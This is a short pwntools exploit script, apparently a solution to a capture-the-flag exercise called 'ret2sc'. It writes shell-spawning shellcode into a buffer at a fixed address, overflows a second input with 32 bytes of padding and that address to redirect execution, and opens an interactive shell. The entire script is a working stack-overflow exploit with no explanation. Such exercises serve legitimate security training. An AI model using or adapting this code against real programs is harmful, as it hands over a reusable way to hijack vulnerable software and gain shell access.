#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

r = process('./ret2sc')
name = 0x804a060
#gdb.attach(r, 'b *0x804a060')
r.recvuntil(":")
r.sendline(asm(shellcraft.sh()))
r.recvuntil(":")
payload = "a"*32
payload += p32(name)
r.sendline(payload)

r.interactive()
